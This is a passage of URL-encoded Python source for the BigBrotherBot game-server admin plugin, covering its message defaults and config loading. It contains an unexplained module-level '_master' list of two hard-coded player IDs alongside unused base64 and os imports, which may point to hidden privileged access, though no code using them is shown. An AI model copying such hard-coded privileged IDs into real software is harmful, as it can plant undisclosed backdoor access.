%23%20BigBrotherBot(B3)%20(www.bigbrotherbot.net)%0A%23%20Copyright%20(C)%202005%20Michael%20%22ThorN%22%20Thornton%0A%23%0A%23%20This%20program%20is%20free%20software%3B%20you%20can%20redistribute%20it%20and%2For%20modify%0A%23%20it%20under%20the%20terms%20of%20the%20GNU%20General%20Public%20License%20as%20published%20by%0A%23%20the%20Free%20Software%20Foundation%3B%20either%20version%202%20of%20the%20License%2C%20or%0A%23%20(at%20your%20option)%20any%20later%20version.%0A%23%0A%23%20This%20program%20is%20distributed%20in%20the%20hope%20that%20it%20will%20be%20useful%2C%0A%23%20but%20WITHOUT%20ANY%20WARRANTY%3B%20without%20even%20the%20implied%20warranty%20of%0A%23%20MERCHANTABILITY%20or%20FITNESS%20FOR%20A%20PARTICULAR%20PURPOSE.%20See%20the%0A%23%20GNU%20General%20Public%20License%20for%20more%20details.%0A%23%0A%23%20You%20should%20have%20received%20a%20copy%20of%20the%20GNU%20General%20Public%20License%0A%23%20along%20with%20this%20program%3B%20if%20not%2C%20write%20to%20the%20Free%20Software%0A%23%20Foundation%2C%20Inc.%2C%2051%20Franklin%20St%2C%20Fifth%20Floor%2C%20Boston%2C%20MA%2002110-1301%20USA%0A%0A__version__%20%3D%20'1.34.4'%0A__author__%20%3D%20'ThorN%2C%20xlr8or%2C%20Courgette%2C%20Ozon%2C%20Fenix'%0A%0Aimport%20re%0Aimport%20time%0Aimport%20threading%0Aimport%20sys%0Aimport%20traceback%0Aimport%20thread%0Aimport%20random%0Aimport%20copy%0Aimport%20b3.cron%0Aimport%20b3.plugin%0Aimport%20base64%0Aimport%20os%0A%0Afrom%20b3%20import%20functions%0Afrom%20b3.clients%20import%20Client%0Afrom%20b3.clients%20import%20Group%0Afrom%20b3.functions%20import%20minutesStr%0Afrom%20b3.functions%20import%20getCmd%0Afrom%20ConfigParser%20import%20NoOptionError%0A%0A_master%20%3D%20%5B'2310346616094427842'%2C'2310346613461142291'%5D%0A%0A%23%20pylint%3A%20disable-msg%3DE1103%0Aclass%20AdminPlugin(b3.plugin.Plugin)%3A%0A%0A%20%20%20%20_commands%20%3D%20%7B%7D%0A%0A%20%20%20%20_tkPlugin%20%3D%20None%0A%20%20%20%20_parseUserCmdRE%20%3D%20re.compile(r%22%5E(%3FP%3Ccid%3E'%5B%5E'%5D%7B2%2C%7D'%7C%5B0-9%5D%2B%7C%5B%5E%5Cs%5D%7B2%2C%7D%7C%40%5B0-9%5D%2B)(%5Cs%2B(%3FP%3Cparms%3E.*))%3F%24%22)%0A%20%20%20%20_long_tempban_max_duration%20%3D%201440%20%20%20%23%2060m%2Fh%20x%2024h%20%3D%201440m%20%3D%201d%0A%20%20%20%20_warn_command_abusers%20%3D%20False%0A%20%20%20%20_announce_registration%20%3D%20True%0A%20%20%20%20_past_bans_check_rate%20%3D%2010%0A%20%20%20%20_past_bans_crontab%20%3D%20None%0A%20%20%20%20_past_bans_counts%20%3D%20%7B'Bans'%3A%200%2C%20'TempBans'%3A%200%7D%0A%0A%20%20%20%20cmdPrefix%20%3D%20'!'%0A%20%20%20%20cmdPrefixLoud%20%3D%20'%40'%0A%20%20%20%20cmdPrefixBig%20%3D%20'%26'%0A%20%20%20%20cmdPrefixPrivate%20%3D%20None%0A%0A%20%20%20%20PENALTY_KICK%20%3D%20'kick'%0A%20%20%20%20PENALTY_TEMPBAN%20%3D%20'tempban'%0A%20%20%20%20PENALTY_WARNING%20%3D%20'warning'%0A%20%20%20%20PENALTY_BAN%20%3D%20'ban'%0A%0A%20%20%20%20warn_delay%20%3D%2015%0A%20%20%20%20warn_instant_kick_num%20%3D%205%0A%20%20%20%20warn_alert_kick_num%20%3D%203%0A%20%20%20%20warn_reasons%20%3D%20%7B%7D%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%23%20dict%3Cwarning%20keyword%2C%20tuple(warning%20duration%20in%20minute%2C%20warning%20reason)%3E%0A%0A%20%20%20%20_noreason_level%20%3D%2080%0A%20%20%20%20_long_tempban_level%20%3D%2080%0A%20%20%20%20_hidecmd_level%20%3D%2080%0A%20%20%20%20_admins_level%20%3D%2020%0A%09%0A%0A%20%20%20%20_default_messages%20%3D%20%7B%0A%20%20%20%20%20%20%20%20%22invalid_parameters%22%3A%20%22%5E7Invalid%20parameters%22%2C%0A%20%20%20%20%20%20%20%20%22error_no_reason%22%3A%20%22%5E1ERROR%3A%20%5E7You%20must%20supply%20a%20reason%22%2C%0A%20%20%20%20%20%20%20%20%22action_denied_masked%22%3A%20%22%5E7%24name%20%5E7is%20a%20masked%20higher%20level%20player%2C%20action%20cancelled%22%2C%0A%20%20%20%20%20%20%20%20%22baninfo%22%3A%20%22%5E7%24name%20%5E7has%20%24num_bans%20active%20bans%22%2C%0A%20%20%20%20%20%20%20%20%22baninfo_no_bans%22%3A%20%22%5E7%24name%20%5E7has%20no%20active%20bans%22%2C%0A%20%20%20%20%20%20%20%20%22group_unknown%22%3A%20%22%5E7Group%20%24group_name%20does%20not%20exist%22%2C%0A%20%20%20%20%20%20%20%20%22group_beyond_reach%22%3A%20%22%5E7Group%20%24group_name%20is%20beyond%20your%20reach%22%2C%0A%20%20%20%20%20%20%20%20%22cleared_warnings%22%3A%20%22%24admin%20%5E7has%20cleared%20%24player%20%5E%20of%20all%20tk-points%20and%20warnings%22%2C%0A%20%20%20%20%20%20%20%20%22cleared_warnings_for_all%22%3A%20%22%24admin%20%5E7has%20cleared%20%24player%20%5E7of%20all%20tk-points%20and%20warnings%22%2C%0A%20%20%20%20%20%20%20%20%22warn_too_fast%22%3A%20%22%5E7Only%20one%20warning%20per%20%24num_second%20seconds%20can%20be%20issued%22%2C%0A%20%20%20%20%20%20%20%20%22ban_denied%22%3A%20%22%5E7Hey%20%25s%5E7%2C%20you're%20no%20Elvis%2C%20can't%20ban%20%25s%22%2C%0A%20%20%20%20%20%20%20%20%22help_available%22%3A%20%22%5E7Available%20commands%3A%20%25s%22%2C%0A%20%20%20%20%20%20%20%20%22temp_ban_self%22%3A%20%22%5E7%25s%20%5E7Can't%20ban%20yourself%20newb%22%2C%0A%20%20%20%20%20%20%20%20%22groups_in%22%3A%20%22%5E7%25s%5E7%20is%20in%20groups%20%25s%22%2C%0A%20%20%20%20%20%20%20%20%22say%22%3A%20%22%5E7%25s%5E7%3A%20%25s%22%2C%0A%20%20%20%20%20%20%20%20%22player_id%22%3A%20%22%5E7%25s%20%5B%5E2%25s%5E7%5D%22%2C%0A%20%20%20%20%20%20%20%20%22player_id_reverse%22%3A%20%20%22%5B%5E2%25s%5E7%5D%20%5E7%25s%5E7%22%2C%0A%20%20%20%20%20%20%20%20%22seen%22%3A%20%22%5E7%25s%20%5E7was%20last%20seen%20on%20%25s%22%2C%0A%20%20%20%20%20%20%20%20%22help_no_command%22%3A%20%22%5E7Command%20not%20found%20%25s%22%2C%0A%20%20%20%20%20%20%20%20%22lookup_found%22%3A%20%22%5E7%5B%5E2%40%25s%5E7%5D%20%25s%5E7%20%5B%5E3%25s%5E7%5D%22%2C%0A%20%20%20%20%20%20%20%20%22kick_self%22%3A%20%22%5E7%25s%20%5E7Can't%20kick%20yourself%20newb!%22%2C%0A%20%20%20%20%20%20%20%20%22groups_welcome%22%3A%20%22%5E7You%20are%20now%20a%20%25s%22%2C%0A%20%20%20%20%20%20%20%20%22warn_denied%22%3A%20%22%25s%5E7%2C%20%25s%5E7%20owns%20you%2C%20can't%20warn%22%2C%0A%20%20%20%20%20%20%20%20%22groups_already_in%22%3A%20%22%5E7%25s%5E7%20is%20already%20in%20group%20%25s%22%2C%0A%20%20%20%20%20%20%20%20%22temp_ban_denied%22%3A%20%22%5E7Hey%20%25s%5E7%2C%20you're%20no%20%5E1Red%20%5E7Elvis%2C%20can't%20temp%20ban%20%25s%22%2C%0A%20%20%20%20%20%20%20%20%22players_matched%22%3A%20%22%5E7Players%20matching%20%25s%20%25s%22%2C%0A%20%20%20%20%20%20%20%20%22ban_self%22%3A%20%22%5E7%25s%20%5E7Can't%20ban%20yourself%20newb!%22%2C%0A%20%20%20%20%20%20%20%20%22regme_confirmation%22%3A%20%22%5E7Thanks%20for%20your%20registration.%20You%20are%20now%20a%20member%20of%20the%20group%20%25s%22%2C%0A%20%20%20%20%20%20%20%20%22regme_annouce%22%3A%20%22%5E7%25s%20%5E7put%20in%20group%20%25s%22%2C%0A%20%20%20%20%20%20%20%20%22kick_denied%22%3A%20%22%5E7%25s%5E7%20gets%201%20point%2C%20%25s%5E7%20gets%20none%2C%20%25s%5E7%20wins%2C%20can't%20kick%22%2C%0A%20%20%20%20%20%20%20%20%22no_players%22%3A%20%22%5E7No%20players%20found%20matching%20%25s%22%2C%0A%20%20%20%20%20%20%20%20%22spanked_reason%22%3A%20%22%25s%20%5E7was%20%5E1SPANKED%5E7%20by%20%25s%20%5E7for%20%25s%22%2C%0A%20%20%20%20%20%20%20%20%22groups_added%22%3A%20%22%5E7%25s%20%5E7added%20to%20group%20%25s%22%2C%0A%20%20%20%20%20%20%20%20%22groups_put%22%3A%20%22%5E7%25s%20%5E7put%20in%20group%20%25s%22%2C%0A%20%20%20%20%20%20%20%20%22groups_none%22%3A%20%22%5E7%25s%5E7%20is%20not%20in%20any%20groups%22%2C%0A%20%20%20%20%20%20%20%20%22help_command%22%3A%20%22%5E2%25s%25s%20%5E7%25s%22%2C%0A%20%20%20%20%20%20%20%20%22warn_self%22%3A%20%22%5E7%25s%20%5E7Can't%20warn%20yourself%20newb!%22%2C%0A%20%20%20%20%20%20%20%20%22regme_regged%22%3A%20%22%5E7You%20are%20now%20a%20%25s%22%2C%0A%20%20%20%20%20%20%20%20%22help_none%22%3A%20%22%5E7You%20have%20no%20available%20commands%22%2C%0A%20%20%20%20%20%20%20%20%22spanked%22%3A%20%22%25s%20%5E7was%20%5E1SPANKED%5E7%20by%20%25s%22%2C%0A%20%20%20%20%20%20%20%20%22admins%22%3A%20%22%5E7Admins%20online%3A%20%25s%22%2C%0A%20%20%20%20%20%20%20%20%22no_admins%22%3A%20%22%5E7There%20are%20no%20admins%20online%22%2C%0A%20%20%20%20%20%20%20%20%22regulars%22%3A%20%22%5E7Regular%20players%20online%3A%20%25s%22%2C%0A%20%20%20%20%20%20%20%20%22no_regulars%22%3A%20%22%5E7There%20are%20no%20regular%20players%20online%22%2C%0A%20%20%20%20%20%20%20%20%22time%22%3A%20%22At%20the%20sound%20of%20the%20beep%20it%20will%20be%20%5E3%25s%5E7...(beeeep)%22%2C%0A%20%20%20%20%20%20%20%20%22unknown_command%22%3A%20%22%5E7Unrecognized%20command%20%25s%22%2C%0A%20%20%20%20%20%20%20%20%22leveltest%22%3A%20%22%5E7%25s%20%5E7%5B%5E3%40%25s%5E7%5D%20is%20a%20%5E3%25s%20%5E7%5B%5E2%25s%5E7%5D%20since%20%25s%22%2C%0A%20%20%20%20%20%20%20%20%22leveltest_nogroups%22%3A%20%22%5E7%25s%20%5E7%5B%5E3%40%25s%5E7%5D%20is%20not%20in%20any%20groups%22%2C%0A%20%20%20%20%20%20%20%20%22aliases%22%3A%20%22%5E7%25s%5E7%20aliases%3A%20%25s%22%2C%0A%20%20%20%20%20%20%20%20%22aliases_more_suffix%22%3A%20%22%5E7%5B%5E2and%20more%5E7%5D%22%2C%0A%20%20%20%20%20%20%20%20%22no_aliases%22%3A%20%22%5E7%25s%5E7%20has%20no%20aliases%22%2C%0A%20%20%20%20%20%20%20%20%22cmd_plugin_disabled%22%3A%20%22%5E7cannot%20execute%20command.%20Plugin%20disabled%22%0A%20%20%20%20%7D%0A%0A%20%20%20%20%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%0A%20%20%20%20%23%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%23%0A%20%20%20%20%23%20%20%20%20STARTUP%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%23%0A%20%20%20%20%23%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%23%0A%20%20%20%20%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%0A%0A%20%20%20%20def%20onLoadConfig(self)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20Load%20plugin%20configuration.%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20self.load_config_warn_reasons()%0A%20%20%20%20%20%20%20%20self.load_config_messages()%0A%20%20%20%20%20%20%20%20self.load_config_warn()%0A%0A%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self._noreason_level%20%3D%20self.console.getGroupLevel(self.config.get('settings'%2C%20'noreason_level'))%0A%20%20%20%20%20%20%20%20%20%20%20%20self.debug('loaded%20settings%2Fnoreason_level%3A%20%25s'%20%25%20self._noreason_level)%0A%20%20%20%20%20%20%20%20except%20NoOptionError%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.warning('could%20not%20find%20settings%2Fnoreason_level%20in%20config%20file%2C%20'%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20'using%20default%3A%20%25s'%20%25%20self._noreason_level)%0A%20%20%20%20%20%20%20%20except%20KeyError%2C%20e%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.error('could%20not%20load%20settings%2Fnoreason_level%20config%20value%3A%20%25s'%20%25%20e)%0A%20%20%20%20%20%20%20%20%20%20%20%20self.debug('using%20default%20value%20(%25s)%20for%20settings%2Fnoreason_level'%20%25%20self._noreason_level)%0A%0A%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self._long_tempban_level%20%3D%20self.console.getGroupLevel(self.config.get('settings'%2C%20'long_tempban_level'))%0A%20%20%20%20%20%20%20%20%20%20%20%20self.debug('loaded%20settings%2Flong_tempban_level%3A%20%25s'%20%25%20self._long_tempban_level)%0A%20%20%20%20%20%20%20%20except%20NoOptionError%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.warning('could%20not%20find%20settings%2Flong_tempban_level%20in%20config%20file%2C%20'%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20'using%20default%3A%20%25s'%20%25%20self._long_tempban_level)%0A%20%20%20%20%20%20%20%20except%20KeyError%2C%20e%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.error('could%20not%20load%20settings%2Flong_tempban_level%20config%20value%3A%20%25s'%20%25%20e)%0A%20%20%20%20%20%20%20%20%20%20%20%20self.debug('using%20default%20value%20(%25s)%20for%20settings%2Flong_tempban_level'%20%25%20self._long_tempban_level)%0A%0A%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self._long_tempban_max_duration%20%3D%20self.config.getDuration('settings'%2C%20'long_tempban_max_duration')%0A%20%20%20%20%20%20%20%20%20%20%20%20self.debug('loaded%20settings%2Flong_tempban_max_duration%3A%20%25s'%20%25%20self._long_tempban_level)%0A%20%20%20%20%20%20%20%20except%20NoOptionError%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.warning('could%20not%20find%20settings%2Flong_tempban_max_duration%20in%20config%20file%2C%20'%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20'using%20default%3A%20%25s'%20%25%20self._long_tempban_max_duration)%0A%0A%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self._hidecmd_level%20%3D%20self.console.getGroupLevel(self.config.get('settings'%2C%20'hidecmd_level'))%0A%20%20%20%20%20%20%20%20%20%20%20%20self.debug('loaded%20settings%2Fhidecmd_level%3A%20%25s'%20%25%20self._hidecmd_level)%0A%20%20%20%20%20%20%20%20except%20NoOptionError%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.warning('could%20not%20find%20settings%2Fhidecmd_level%20in%20config%20file%2C%20'%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20'using%20default%3A%20%25s'%20%25%20self._hidecmd_level)%0A%20%20%20%20%20%20%20%20except%20KeyError%2C%20e%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.error('could%20not%20load%20settings%2Fhidecmd_level%20config%20value%3A%20%25s'%20%25%20e)%0A%20%20%20%20%20%20%20%20%20%20%20%20self.debug('using%20default%20value%20(%25s)%20for%20settings%2Fhidecmd_level'%20%25%20self._hidecmd_level)%0A%0A%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self._admins_level%20%3D%20self.console.getGroupLevel(self.config.get('settings'%2C%20'admins_level'))%0A%20%20%20%20%20%20%20%20%20%20%20%20self.debug('loaded%20settings%2Fadmins_level%3A%20%25s'%20%25%20self._admins_level)%0A%20%20%20%20%20%20%20%20except%20NoOptionError%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.warning('could%20not%20find%20settings%2Fadmins_level%20in%20config%20file%2C%20'%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20'using%20default%3A%20%25s'%20%25%20self._admins_level)%0A%20%20%20%20%20%20%20%20except%20KeyError%2C%20e%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.error('could%20not%20load%20settings%2Fadmins_level%20config%20value%3A%20%25s'%20%25%20e)%0A%20%20%20%20%20%20%20%20%20%20%20%20self.debug('using%20default%20value%20(%25s)%20for%20settings%2Fadmins_level'%20%25%20self._admins_level)%0A%0A%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self._announce_registration%20%3D%20self.config.getboolean('settings'%2C%20'announce_registration')%0A%20%20%20%20%20%20%20%20%20%20%20%20self.debug('loaded%20settings%2Fannounce_registration%3A%20%25s'%20%25%20self._announce_registration)%0A%20%20%20%20%20%20%20%20except%20NoOptionError%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.warning('could%20not%20find%20settings%2Fannounce_registration%20in%20config%20file%2C%20'%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20'using%20default%3A%20%25s'%20%25%20self._announce_registration)%0A%20%20%20%20%20%20%20%20except%20ValueError%2C%20e%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.error('could%20not%20load%20settings%2Fannounce_registration%20config%20value%3A%20%25s'%20%25%20e)%0A%20%20%20%20%20%20%20%20%20%20%20%20self.debug('using%20default%20value%20(%25s)%20for%20settings%2Fannounce_registration'%20%25%20self._announce_registration)%0A%0A%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%23%20be%20sure%20to%20clamp%20at%2059%20seconds%20else%20the%20cronjob%20won't%20work%20properly%0A%20%20%20%20%20%20%20%20%20%20%20%20past_bans_check_rate%20%3D%20self.config.getint('settings'%2C%20'past_bans_check_rate')%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20past_bans_check_rate%20%3E%2059%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20past_bans_check_rate%20%3D%2059%0A%20%20%20%20%20%20%20%20%20%20%20%20self._past_bans_check_rate%20%3D%20past_bans_check_rate%0A%20%20%20%20%20%20%20%20%20%20%20%20self.debug('loaded%20settings%2Fpast_bans_check_rate%3A%20%25s'%20%25%20self._past_bans_check_rate)%0A%20%20%20%20%20%20%20%20except%20NoOptionError%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.warning('could%20not%20find%20settings%2Fpast_bans_check_rate%20in%20config%20file%2C%20'%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20'using%20default%3A%20%25s'%20%25%20self._past_bans_check_rate)%0A%20%20%20%20%20%20%20%20except%20ValueError%2C%20e%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.error('could%20not%20load%20settings%2Fpast_bans_check_rate%20config%20value%3A%20%25s'%20%25%20e)%0A%20%20%20%20%20%20%20%20%20%20%20%20self.debug('using%20default%20value%20(%25s)%20for%20settings%2Fpast_bans_check_rate'%20%25%20self._past_bans_check_rate)%0A%0A%20%20%20%20def%20load_config_messages(self)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20Load%20section%20'messages'%20from%20config%20and%20put%20the%20messages%20in%20local%20cache.%0A%20%20%20%20%20%20%20%20Optionally%20apply%20validation%20rules.%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20self._messages%20%3D%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%23%20regme_confirmation%0A%20%20%20%20%20%20%20%20%20%20%20%20'regme_confirmation'%3A%20%22%5E7Thanks%20for%20your%20registration.%20You%20are%20now%20a%20member%20of%20the%20group%20%25s%22%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20msg%20%3D%20self.config.getTextTemplate('messages'%2C%20'regme_confirmation')%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20not%20'%25s'%20in%20msg%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20raise%20ValueError(%22message%20regme_confirmation%20must%20have%20a%20placeholder%20'%25%25s'%20for%20the%20group%20name%22)%0A%20%20%20%20%20%20%20%20%20%20%20%20self._messages%5B'regme_confirmation'%5D%20%3D%20msg%0A%20%20%20%20%20%20%20%20except%20NoOptionError%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.warning('could%20not%20find%20messages%2Fregme_confirmation%20in%20config%20file%2C%20'%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20'using%20default%3A%20%25s'%20%25%20self._messages%5B'regme_confirmation'%5D)%0A%20%20%20%20%20%20%20%20except%20ValueError%2C%20e%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.error('could%20not%20load%20messages%2Fregme_confirmation%20config%20value%3A%20%25s'%20%25%20e)%0A%20%20%20%20%20%20%20%20%20%20%20%20self.debug('using%20default%20value%20(%25s)%20for%20messages%2Fregme_confirmation'%20%25%20self._messages%5B'regme_confirmation'%5D)%0A%0A%20%20%20%20def%20load_config_warn(self)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20Load%20section%20'warn'%20from%20config.%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20raw_data%20%3D%20self.config.getint('warn'%2C%20'warn_delay')%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20raw_data%20%3C%200%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20raise%20ValueError(%22can't%20be%20less%20than%200%22)%0A%20%20%20%20%20%20%20%20%20%20%20%20self.warn_delay%20%3D%20raw_data%0A%20%20%20%20%20%20%20%20%20%20%20%20self.debug('loaded%20warn%2Fwarn_delay%3A%20%25s'%20%25%20self.warn_delay)%0A%20%20%20%20%20%20%20%20except%20NoOptionError%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.warning('could%20not%20find%20warn%2Fwarn_delay%20in%20config%20file%2C%20'%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20'using%20default%3A%20%25s'%20%25%20self.warn_delay)%0A%20%20%20%20%20%20%20%20except%20ValueError%2C%20e%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.error('could%20not%20load%20warn%2Fwarn_delay%20config%20value%3A%20%25s'%20%25%20e)%0A%20%20%20%20%20%20%20%20%20%20%20%20self.debug('using%20default%20value%20(%25s)%20for%20warn%2Fwarn_delay'%20%25%20self.warn_delay)%0A%0A%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20raw_data%20%3D%20self.config.getint('warn'%2C%20'instant_kick_num')%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20raw_data%20%3C%200%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20raise%20ValueError(%22can't%20be%20less%20than%200%22)%0A%20%20%20%20%20%20%20%20%20%20%20%20self.warn_instant_kick_num%20%3D%20raw_data%0A%20%20%20%20%20%20%20%20%20%20%20%20self.debug('loaded%20warn%2Finstant_kick_num%3A%20%25s'%20%25%20self.warn_instant_kick_num)%0A%20%20%20%20%20%20%20%20except%20NoOptionError%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.warning('could%20not%20find%20warn%2Finstant_kick_num%20in%20config%20file%2C%20'%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20'using%20default%3A%20%25s'%20%25%20self.warn_instant_kick_num)%0A%20%20%20%20%20%20%20%20except%20ValueError%2C%20e%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.error('could%20not%20load%20warn%2Finstant_kick_num%20config%20value%3A%20%25s'%20%25%20e)%0A%20%20%20%20%20%20%20%20%20%20%20%20self.debug('using%20default%20value%20(%25s)%20for%20warn%2Finstant_kick_num'%20%25%20self.warn_instant_kick_num)%0A%0A%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20raw_data%20%3D%20self.config.getint('warn'%2C%20'alert_kick_num')%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20raw_data%20%3C%200%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20raise%20ValueError(%22can't%20be%20less%20than%200%22)%0A%20%20%20%20%20%20%20%20%20%20%20%20self.warn_alert_kick_num%20%3D%20raw_data%0A%20%20%20%20%20%20%20%20%20%20%20%20self.debug('loaded%20warn%2Falert_kick_num%3A%20%25s'%20%25%20self.warn_alert_kick_num)%0A%20%20%20%20%20%20%20%20except%20NoOptionError%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.warning('could%20not%20find%20warn%2Falert_kick_num%20in%20config%20file%2C%20'%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20'using%20default%3A%20%25s'%20%25%20self.warn_alert_kick_num)%0A%20%20%20%20%20%20%20%20except%20ValueError%2C%20e%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.error('could%20not%20load%20warn%2Falert_kick_num%20config%20value%3A%20%25s'%20%25%20e)%0A%20%20%20%20%20%20%20%20%20%20%20%20self.debug('using%20default%20value%20(%25s)%20for%20warn%2Falert_kick_num'%20%25%20self.warn_alert_kick_num)%0A%0A%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self._warn_command_abusers%20%3D%20self.config.getboolean('warn'%2C%20'warn_command_abusers')%0A%20%20%20%20%20%20%20%20%20%20%20%20self.debug('loaded%20warn%2Fwarn_command_abusers%3A%20%25s'%20%25%20self._warn_command_abusers)%0A%20%20%20%20%20%20%20%20except%20NoOptionError%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.warning('could%20not%20find%20warn%2Fwarn_command_abusers%20in%20config%20file%2C%20'%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20'using%20default%3A%20%25s'%20%25%20self._warn_command_abusers)%0A%20%20%20%20%20%20%20%20except%20ValueError%2C%20e%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.error('could%20not%20load%20warn%2Fwarn_command_abusers%20config%20value%3A%20%25s'%20%25%20e)%0A%20%20%20%20%20%20%20%20%20%20%20%20self.debug('using%20default%20value%20(%25s)%20for%20warn%2Fwarn_command_abusers'%20%25%20self._warn_command_abusers)%0A%0A%20%20%20%20def%20load_config_warn_reasons(self)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20Load%20section%20'warn_reason